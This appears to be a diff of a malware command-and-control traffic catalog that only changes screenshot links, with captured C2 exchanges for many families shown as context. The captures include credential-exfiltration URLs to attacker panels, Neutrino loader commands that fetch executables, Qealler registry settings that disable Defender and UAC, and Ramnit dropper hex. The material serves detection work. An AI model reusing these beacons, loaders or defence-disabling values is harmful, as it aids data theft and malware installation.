 <html><body><script type="text/javascript" src="/aes.js" ></script><script>function toNumbers(d){var e=[];d.replace(/(..)/g,function(d){e.push(parseInt(d,16))});return e}function toHex(){for(var d=[],d=1==arguments.length&&arguments[0].constructor==Array?arguments[0]:arguments,e="",f=0;f<d.length;f++)e+=(16>d[f]?"0":"")+d[f].toString(16);return e.toLowerCase()}var a=toNumbers("f655ba9d09a112d4968c63579db590b4"),b=toNumbers("98344c2eee86c3994890592585b49f80"),c=toNumbers("ee3d72471e3c40514be9a177719112c3");document.cookie="__test="+toHex(slowAES.decrypt(c,2,a,b))+"; expires=Thu, 31-Dec-37 23:55:55 GMT; path=/"; location.href="http://pacificglobal.ga/panel/post.php?type=passwords&machinename=USER-PC&application=MS%20Outlook%202002/2003/2007/2010&link=192.168.1.1&username=honey@pot.com&password=honeypass356&i=1";</script><noscript>This site requires Javascript to work, please enable Javascript in your browser or use a browser with Javascript support</noscript></body></html>
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/keybase.png "Keybase")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/keybase.png "Keybase")
 
 #### Koadic
 ~~~
@@ -1774,7 +1774,7 @@ HTTP/1.0 200 OK
 Server: Apache
 Date: Wed, 22 Jan 2020 16:29:00 GMT
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/koadic.png "Koadic")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/koadic.png "Koadic")
 
 #### Kpot stealer
 Follow tcp stream, not http stream in wireshark
@@ -1836,8 +1836,8 @@ Content-Type: text/html; charset=UTF-8
 Transfer-Encoding: chunked
 Connection: keep-alive
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/kpot.png "Kpot stealer")
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/kpot2.png "Kpot stealer")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/kpot.png "Kpot stealer")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/kpot2.png "Kpot stealer")
 
 #### KrugBot
 ~~~
@@ -1852,7 +1852,7 @@ w+xWBGqDB44jDCJcr66AgCqhZYhj04B5PCPqMNaf8It2IfuX9Ffysaqp+tjcUhGW3JH1nJk8
 ud1kko0C6+v/tp2PLOVR0ac3GacRi0dUf/+ASue6AJNOfh4WliURnubviRXJkcj+5f7vA3Xa
 jg==
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/krugbot.png "Krugbot")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/krugbot.png "Krugbot")
 
 #### Krypton Stealer
 ~~~
@@ -1866,7 +1866,7 @@ Cache-Control: no-cache
 
 id=01&message=test_message
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/krypton.png "KryptonStealer")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/krypton.png "KryptonStealer")
 
 #### Lazagne
 ~~~
@@ -1929,7 +1929,7 @@ Server: Apache/2.4.18 (Ubuntu)
 Content-Length: 1
 Content-Type: text/html; charset=UTF-8
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/lazagne.png "Lazagne")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/lazagne.png "Lazagne")
 
 #### Loda
 I've never seen this without the beta flah
@@ -1938,7 +1938,7 @@ x|lugocv|x|admin|WIN_7|X86| |Disabled|1.1.2|ddd|Pr720X21280X3|Desktop|0|beta
 
 ZeXro0
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/loda.png "Loda")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/loda.png "Loda")
 
 #### Lokibot
 
@@ -1957,7 +1957,7 @@ Connection: close
 ..'.......ckav.ru..
 ...a.d.m.i.n.......U.S.E.R.-.P.C.......U.S.E.R.-.P.C......................+................0...8.5.6.9.A.A.F.F.6.3.A.A.A.7.1.D.8.0.4.0.0.E.2.5.....Rqbay....
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/lokibot.png "Lokibot")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/lokibot.png "Lokibot")
 
 #### Metamorpho/Metamorfo BR Banker
 ~~~
@@ -2006,8 +2006,8 @@ Content-Length: 0
 Date: Tue, 22 Oct 2019 20:06:32 GMT
 Server: LiteSpeed
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/metamorpho.png "Metamorpho")
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/metamorfo-1.png "Metamorpho")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/metamorpho.png "Metamorpho")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/metamorfo-1.png "Metamorpho")
 
 #### Micropsia
 ~~~
@@ -2046,7 +2046,7 @@ Content-Transfer-Encoding: 8bit
 No Instance(s) Available.
 ----------121819110609549--
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/micropsia.png "Micropsia")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/micropsia.png "Micropsia")
 
 #### MilkyBoy
 ~~~
@@ -2092,8 +2092,8 @@ kk.:......m$....B.._.E........PK........G.IO................PASSWORDS/CBase/PK..
 ...^z.6..t#....(@W.r43...U.iT.-.....%6.....1......}5......iG..Ut.i|".I....$...~...Q.yr_.....tA."..
 @.p...',.!O!e..T.v.6..T.hEY*..H..Sq)....L......~...CD....E.0..Sa.T	..`b.J*i...G..."xpF.......PK........o.)M0..W............PASSWORDS/FBase
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/milkyboy-1.png "Milkyboy 1")
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/milkyboy-2.png "Milkyboy 2")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/milkyboy-1.png "Milkyboy 1")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/milkyboy-2.png "Milkyboy 2")
 
 #### MirageFox
 ~~~
@@ -2107,7 +2107,7 @@ Encoding: gzip, deflate
 Accept-Language: en-us
 Host: 172.16.100.1
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/miragefox.png "MirageFox")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/miragefox.png "MirageFox")
 
 #### Nanocore
 
@@ -2118,7 +2118,7 @@ flag on "38 00 00 00 17" pattern
 00000020  04 ea d0 16 f2 cf 3e 51 29 18 55 e5 1c 7a 6a 91   ......>Q ).U..zj.
 00000030  03 99 38 f7 ac 3b f7 89 85 2e c4 d8               ..8..;.. ....
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/nanocore-38.png "Nanocore 38")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/nanocore-38.png "Nanocore 38")
 
 flag on "40 00 00 00 17" pattern:
 ~~~
@@ -2128,7 +2128,7 @@ flag on "40 00 00 00 17" pattern:
 00000030  bd e7 23 95 3e ab a1 04 ca 56 b3 fb b7 9b b7 3a   ..#.>... .V.....:
 00000040  13 e5 2b 52                                        ..+R
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/nanocore-40.png "Nanocore 40")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/nanocore-40.png "Nanocore 40")
 
 flag on "50 00 00 00 82" pattern:
 ~~~
@@ -2139,7 +2139,7 @@ flag on "50 00 00 00 82" pattern:
 00000040  0a ea 28 ad ba f6 87 d0 b7 4d 45 78 6a 71 84 19   ..(..... .MExjq..
 00000050  34 cc c6 79                                        4..y
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/nanocore-50.png "Nanocore 50")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/nanocore-50.png "Nanocore 50")
 
 #### NetSupport RAT
 ~~~
@@ -2183,7 +2183,7 @@ CMD=ENCD
 ES=1
 DATA=l3.<(T{.E.....V....k.9|||$(m..$C.M..=I0`!.....^.....?sq. 
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/netsupport.png "NetSupport RAT")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/netsupport.png "NetSupport RAT")
 
 #### Netwire
 flag on "41 00 00 00 99" pattern in initial packet
@@ -2194,7 +2194,7 @@ flag on "41 00 00 00 99" pattern in initial packet
 00000030  a0 a0 f3 a0 b0 0a 94 04 84 31 7c 3f e7 8c 90 c5   ........ .1|?....
 00000040  ce c4 11 97 d9                                     .....
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/netwire.png "Netwire 40")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/netwire.png "Netwire 40")
 
 #### Neutrino
 ~~~
@@ -2224,7 +2224,7 @@ Vary: User-Agent
 error was encountered while trying to use an ErrorDocument to handle the request.</p>
 </body></html><!---MTU3MDI2MTQzNjkyODM2MyNyYXRlIDUjMTQ2MzAyMDA2NjUxNjE2OSNzY3JlZW5zaG90IzE0NjkxMDAwOTY4ODIwMDAjYm90a2lsbGVyIzE1NzAyNjMxNzk5MTUwMDAjTE9BREVSIGh0dHA6Ly9zbGlwY2VudHJhbC5jb20vcGFuZWwvNTIvdXBsb2FkL2twKDEpLmV4ZSBydW4jMTU3MDI1OTIyNTI4Njg5NCNGSU5EICUyQWRhdCUyQSMxNTcwMjYyMjA3Njc0NDQzI0NNRC1SZXN1bHQgaXBjb25maWcjMTU3MDI2MzE4ODkxMzkyOCNETlMgaHR0cDovL3NsaXBjZW50cmFsLmNvbS9wYW5lbC81Mi91cGxvYWQveHNsYXllciBjdnYgY2hlY2tlci5leGUgcnVuIzE1NzAyNjM3NzM3MjkxNjUjRklORCB0eHQjMTU3MDI2Mzc4MDYwOTkwNCNGSU5EIGpwZyMxNTcwMjYyMjA3ODg2MjAwI0NNRC1SZXN1bHQgaXBjb25maWcjMTU3MDI2MjMwNDMzOTAxNyNGSU5EIHdlYmluamVjdHMudHh0IzE1NzAyNjI1MTM0ODkxMDYjRklORCAlNUMlMjZxdW90JTNCdHh0JTVDJTI2cXVvdCUzQiMxNTcwMjYzMzQxNzU4MzE3I0xPQURFUiBodHRwOi8vc2xpcGNlbnRyYWwuY29tL3BhbmVsLzUyL3VwbG9hZC96ZXVzIGNhbmFkYS5leGUgcnVuIzE1NzAyNzM4OTk0MTc4NTMjQ01ELVJlc3VsdCBwc2xpc3QjMTU3MDI3Mjk4MTIxNDQ0NSNDTUQtUmVzdWx0IHBzbGlzdCMxNTcwMjYzNzI2NjY5NzcyI0NNRC1SZXN1bHQgdGFza2xpc3Qj--->
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/neutrino.png "Neutrino")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/neutrino.png "Neutrino")
 
 #### Nukesped
 ~~~
@@ -2263,7 +2263,7 @@ Content-Type: text/html; charset=UTF-8
 
 0
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/nukesped.png "Nukesped")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/nukesped.png "Nukesped")
 
 #### Orcus RAT
 Machine name is SNI
@@ -2284,7 +2284,7 @@ Machine name is SNI
 ...........}.#zu....*...eW.+..c8..qk^.8....F..S"u.:..=...C  .K.z....P...Y..M[..d.2p..U....O=.|*4-....S;.b...I......1t.~Z..e.ETxk...r(u_g........a...?.y$t..LR.:..>...3j..gT		.....DJH..N.MJD.eb...I...}.V^5a...\@.S..........4..u_...l$y....k*......|...D..Z
 .8S...i..z.9.&..5F.......A..V.c\.{..I...1|.W..td?...Y.....
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/orcus.png "Orcus RAT")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/orcus.png "Orcus RAT")
 
 #### Origin Keylogger
 ~~~
@@ -2327,7 +2327,7 @@ Content-Disposition: attachment
 
 UEsDBBQAAAgIAIRp/k5nVtI5VAoAAABwAAAjAAAANGR6M3hiMHAuaGRhL0Nocm9tZS9E
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/origin.png "Origin Keylogger")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/origin.png "Origin Keylogger")
 
 #### Oski Stealer
 ~~~
@@ -2406,8 +2406,8 @@ Content-Length: 0
 Date: Wed, 26 Feb 2020 11:23:19 GMT
 Server: LiteSpeed
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/oski1.png "Oski")
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/oski2.png "Oski")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/oski1.png "Oski")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/oski2.png "Oski")
 
 #### Ostap
 ~~~
@@ -2467,9 +2467,9 @@ https://51.83.206.98/1/1.php?g=m4&b=4a01758c&c=ACCOUNTDOMAIN@@LARRY-ACCOUNTIN@@L
 https://45.128.134.14/C821al/vc2Tmy.php?h=m2&j=4a01758c&l=ACCOUNTDOMAIN@@LARRY-ACCOUNTIN@@Larry@@*172.16.0.2%3A%3A%5B00000001%5D%20Intel%28R%29%20Ethernet%20Connection%20I217-LM&13742148
 ~~~
 
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ostap-1.png "Ostap")
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ostap-2.png "Ostap")
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ostap-3.png "Ostap")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/ostap-1.png "Ostap")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/ostap-2.png "Ostap")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/ostap-3.png "Ostap")
 
 #### Parallax RAT
 ~~~
@@ -2510,7 +2510,7 @@ https://45.128.134.14/C821al/vc2Tmy.php?h=m2&j=4a01758c&l=ACCOUNTDOMAIN@@LARRY-A
     00000054  fd af c9 1e 5e c9 68 88  70 a6 27 7e 6f 95 7b d5   ....^.h. p.'~o.{.
     00000064  ed 48 fd 08                                        .H..
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/parallax.png "Parallax")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/parallax.png "Parallax")
 
 #### ParasiteHTTP Loader
 ~~~
@@ -2539,7 +2539,7 @@ Content-Type: text/html; charset=utf-8
 
 8jQG4riRhJFWMlJ9RTKeV7k45+I3REM8JjIIBZ2ttxzjDFxOX7VjxuypIrJn9cQ1ZMg6fvgWSSpto3sivUfvUCHWLzb2ljPhPugPTYb0KsgResnAIFl+aoqF5m9bCyBd6PMoRLdOdsuDW+E3wrb7ZNpApXlX2htDZRNhaqfST8eBE9Cvl7H0vyUzY+BfH5M4fvvt71DCRt2OP31tgu7aMMxM0mUWvBBZcNpeZzLRdMFd0Ea1u3oM+vLWrhFLYGuCWN6TPaqlEpw/9pgLUI8BhxUYFOJvyTRIFwXmlQPWMY6qg0/l+b5Ha+SYCnLtw8Uyqilil+OBM+KM5MT4C4l9vkXsv/ID9X8ZRr2l9cHzlW5J7sLVrGeH26KmBrjqBM3c4Ini4VTZZCr5KDrsRpi21NaheQLGLA==
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/parasitehttp.png "ParasiteHTTP Loader")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/parasitehttp.png "ParasiteHTTP Loader")
 
 #### Parasite Stealer aka Nexus
 ~~~
@@ -2560,8 +2560,8 @@ Server: Apache/2.4.29 (Ubuntu)
 Content-Length: 0
 Content-Type: text/html; charset=UTF-8
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/parasite1.png "Parasite stealer")
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/parasite2.png "Parasite stealer")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/parasite1.png "Parasite stealer")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/parasite2.png "Parasite stealer")
 
 #### Phoenix Keylogger
 ~~~
@@ -2625,7 +2625,7 @@ PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KIA==
 .
 250 2.0.0 Ok: queued as 7CDF2181E51
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/phoenix.png "Phoenix")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/phoenix.png "Phoenix")
 
 #### Plugx
 ~~~
@@ -2665,9 +2665,9 @@ Expires: Thu, 01 Jan 1970 00:00:00 GMT
 X-Server: ip-172-31-28-245
 Set-Cookie: JSESSIONID=4618E9008B004BEE8FE5C81AB063A332; Path=/; HttpOnly
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/plugx-1.png "Plugx")
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/plugx-2.png "PlugxDNS")
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/plugx-3.png "Plugx")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/plugx-1.png "Plugx")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/plugx-2.png "PlugxDNS")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/plugx-3.png "Plugx")
 
 #### Pony
 Follow tcp stream, not http stream in wireshark
@@ -2699,7 +2699,7 @@ X-Powered-By: PHP/5.4.45
 ..
 .....f>k.X.......
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/pony.png "Pony")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/pony.png "Pony")
 
 #### Pony Loader
 ~~~
@@ -2721,7 +2721,7 @@ Content-Type: text/html; charset=UTF-8
 
 STATUS-IMPORT-OK
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/pony-loader.png "Pony Loader")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/pony-loader.png "Pony Loader")
 
 #### Predator Pain Keylogger
 ~~~
@@ -2784,7 +2784,7 @@ very=0D=0A                                 **********************=
 .
 250 OK id=1iL7LE-003ina-5V
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/predatorpain.png "Predator Pain Keylogger")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/predatorpain.png "Predator Pain Keylogger")
 
 #### Predator the Thief
 ~~~
@@ -2849,14 +2849,14 @@ H,.../J.......f@.`...+.CK#=C3.=C=C../..PK..........IO................General/UT
 f...Y.[.V.......G.*"...Ig..Y...k=}..}..U....@....T..n.-)7Z.Yt..%...$.P.vQ....p.z..&..t...P[...w...T....6A..!k...:...V...Fp.....-.a.....7......_.X...E../;..T8..7.I..)Y..(..,....)JP..........nf..g..E.\..(..@..XQ.l....".e..a.X .H.?*.".a.F9`..~zrzr..	.M......
 .
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/predator.png "Predator")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/predator.png "Predator")
 
 #### Proyecto (aka Nemours) RAT
 ~~~
 0|New - 25-10-19/21:41|United States|USER-PC - admin|Windows 7 Professional - 32 Bits / Intel(R) Core(TM) i5-6400 CPU @ 2.70GHz / 4 /  / 0|US|0|192.168.100.60|0 Cap.|oolkth|9090|OFF| - 0 / || Tiene Capturas de: |New - |||No Available
 13|Program Manager|OFF|OFF - 0 / ||
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/proyecto.png "Proyecto")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/proyecto.png "Proyecto")
 
 #### Pyrogenic
 flah on "53 E1 6D D3 9E EE 45 D4" on iniial connection, 175 bytes
@@ -2874,7 +2874,7 @@ flah on "53 E1 6D D3 9E EE 45 D4" on iniial connection, 175 bytes
 00000091  e0 47 c5 56 c9 e0 0f 17  73 95 ee 30 08 fa 0e 47   .G.V.... s..0...G
 000000A1  cd ec dd 72 db e7 ff bf  b9 57 b3 61 c4 cb 4c      ...r.... .W.a..L
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/pyrogenic.png "Pyrogenic")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/pyrogenic.png "Pyrogenic")
 
 #### Qbot
 usually url is /t3
@@ -2895,13 +2895,13 @@ Content-Length: 41
 
 ParseHttpResponse() failed pCurlResp=NULL
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/qbot.png "Qbot Qakbot")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/qbot.png "Qbot Qakbot")
 
 #### Qealler RAT
 ~~~
 ........t.]{"serverPath":"C:\\Users\\Jonathan\\Desktop\\PO6671.jar","securityRetry":20,"vbox":false,"serverVersion":"v2.0.0","mainPath":"C:\\Users\\Jonathan\\QkpCj","nickName":"14TH TWETWE APRIL","vmware":false,"encryptKey":"NnKHsguoUsbJwLwumvSXFoiWR","operatingSystem":{"osDefaultArch":"amd64","country":{"code":"us","name":"United States"},"icon":"windows7","admin":true,"language":"English (United States)","type":1,"processor":2,"osDefaultName":"Windows 7","computerUser":"Jonathan","javaArchitecture":"amd64","computerName":"JONATHAN-PC","name":"Windows 7 Professional","osDefaultVersion":"6.1","jreVersion":"1.8.0","architecture":"amd64","ram":"3 GB"},"uuid":"7094850e-92de-4eed-b492-65d966bc00b5lumteifxDUDU","command":1,"network":[{"delay":2,"port":4424,"dns":"marketingsiamgrains.zapto.org"}],"jrePath":"C:\\Users\\Jonathan\\Oracle\\bin\\javaw.exe","userTitle":"Jonathan@JONATHAN-PC","security":[{"process":["UserAccountControlSettings.exe"],"code":"user-account-control","reg":[{"value":"\"ConsentPromptBehaviorAdmin\"=dword:00000000\r\n\"ConsentPromptBehaviorUser\"=dword:00000000\r\n\"EnableLUA\"=dword:00000000\r\n\"PromptOnSecureDesktop\"=dword:00000000\r\n","key":"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","valuesCommand":[]}],"name":{"en":"User Account Control"}},{"process":["Taskmgr.exe"],"code":"task-manager","reg":[{"value":"\"DisableTaskMgr\"=dword:00000002\r\n","key":"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","valuesCommand":[{"name":"DisableTaskMgr","valueCommand":"2","valueCommandType":"REG_DWORD","key":"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"}]}],"name":{"en":"Task Manager"}},{"process":["procexp.exe"],"code":"msconfig","name":{"en":"MsConfig"}},{"process":["MSASCuiL.exe","MSASCui.exe","MsMpEng.exe","MpUXSrv.exe","MpCmdRun.exe","NisSrv.exe","ConfigSecurityPolicy.exe"],"code":"windows-defender","reg":[{"value":"\"DisableAntiSpyware\"=dword:00000001\r\n","key":"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender","valuesCommand":[{"name":"DisableAntiSpyware","valueCommand":"1","valueCommandType":"REG_DWORD","key":"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender"}]},{"value":"\"DisableBehaviorMonitoring\"=dword:00000001\r\n\"DisableOnAccessProtection\"=dword:00000001\r\n\"DisableScanOnRealtimeEnable\"=dword:00000001\r\n","key":"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection","valuesCommand":[{"name":"DisableBehaviorMonitoring","valueCommand":"1","valueCommandType":"REG_DWORD","key":"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection"},{"name":"DisableOnAccessProtection","valueCommand":"1","valueCommandType":"REG_DWORD","key":"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection"},{"name":"DisableScanOnRealtimeEnable","valueCommand":"1","valueCommandType":"REG_DWORD","key":"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection"}]}],"name":{"en":"Windows Defender"}}],"installDate":{"daysRunning":0,"lastModified":1586920462000},"installation":{"jarName":"vrpiI","moduleFolder":"fZrJY","moduleEntry":"LmqeMOCMZKDnCAMInhONhNssACvKupnYNmRGqciHQTmDqMeajNLIKvjeiGOkSFQDkiMQfSaBSp/atbrMtgqBWJtmbTArraiRtMHwMQqwICMrbnBkjtHHUsULWJhUZZJAlRSSnSZvWFv/hidBDxdVcfNQOjMqVwjrrjqXirgxqjnS.BlDbZGWeXeYlqIdKpxKaROeDvagYjATCOaTNXXRK","uniqueIDFile":".ntusernt.ini","delay":2,"jreFolder":"Oracle","active":true,"mainFolder":"QkpCj","moduleExtension":"Jus.txt","jarExtension":"class.txt","jarRegistry":"eHgASPs"},"localIp":"192.168.100.101"}t..{"command":104}t..{"command":114}t..{"command":115}t.N{"title":"\r\n[Administrator: Command Prompt - dump  2888]\r\n","command":115}t.H{"time":{"hour":0,"minute":0,"second":0},"command":114,"sleeping":false}t.A{"title":"\r\n[Administrator: Command Prompt]\r\n","command":115}t.,{"title":"\r\n[TCPHound]\r\n","command":115}t. {"moduleId":"008","command":108}t.X{"title":"\r\n[MegaDumper 1.0 by CodeCracker / SnD (Not Responding)]\r\n","command":115}t.G{"title":"\r\n[MegaDumper 1.0 by CodeCracker / SnD]\r\n","command":115}t. {"moduleId":"008","command":108}t.H{"time":{"hour":0,"minute":0,"second":0},"command":114,"sleeping":false}t.,{"title":"\r\n[TCPHound]\r\n","command":115}t.N{"title":"\r\n[Administrator: Command Prompt - dump  2888]\r\n","command":115}t..{"command":111}
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/qealler.png "Qealler")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/qealler.png "Qealler")
 
 #### Quasar RAT
 Flag on "40 00 00 00" pattern, 68 data bytes on first packet
@@ -2912,7 +2912,7 @@ Flag on "40 00 00 00" pattern, 68 data bytes on first packet
 00000030  20 5b 19 e5 7c ae ed f1 b4 5a d2 ce 5f 86 17 20    [..|... .Z.._.. 
 00000040  c6 b3 03 8c                                        ....
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/quasar.png "Quasar")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/quasar.png "Quasar")
 
 #### Qudox
 ~~~
@@ -2933,7 +2933,7 @@ Content-Length: 76
 
 TBOs3enZOi2/1kVNZdn9bAt1EnPmqL4g9GBGU95XoNzQo6hiYel7j0rkpapVu45CkORs54FJtg==
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/qudox.png "Qudox")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/qudox.png "Qudox")
 
 #### Qulab Clipper
 ~~~
@@ -2980,7 +2980,7 @@ Content-Type: application/octet-stream
 ....d%{.$MR`e!.]..$
 ...-.ct...~Za@YsbNNG...~.R......b..'..oRW3.L..N..&.Q4.
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/qulab.png "Qulab")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/qulab.png "Qulab")
 
 #### RaaLoader aka Pefsire
 ~~~
@@ -2990,7 +2990,7 @@ Content-Type: application/octet-stream
     00000005  00 00 00 00 06                                     .....
 00000011  00 00 00 00 06                                     .....
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/raaloader.png "RaaLoader")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/raaloader.png "RaaLoader")
 
 #### Raccoon Stealer
 ~~~
@@ -3061,8 +3061,8 @@ Access-Control-Allow-Origin: *
 
 true"success"
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/raccoon-1.png "Predator")
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/raccoon-2.png "Predator")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/raccoon-1.png "Predator")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/raccoon-2.png "Predator")
 
 #### Ramnit
 ~~~
@@ -3130,7 +3130,7 @@ body {
 DropFileName = "svchost.exe"
 WriteData = "4D5A90000300000004000000FFFF0000B80000000000000040000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ramnit.png "Ramnit")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/ramnit.png "Ramnit")
 
 #### Real Thin Client
 ~~~
@@ -3173,8 +3173,8 @@ CONTENT-LENGTH: 16
 
 xa...x..N.qM...
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/realthinclient-1.png "Real Thin Client")
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/realthinclient-2.png "Real Thin Client")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/realthinclient-1.png "Real Thin Client")
+![alt text](https://github.com/WHOLETTHEDOG-OUT/c2db/blob/master/images/realthinclient-2.png "Real Thin Client")
 
 #### Redline Stealer
 ~~~
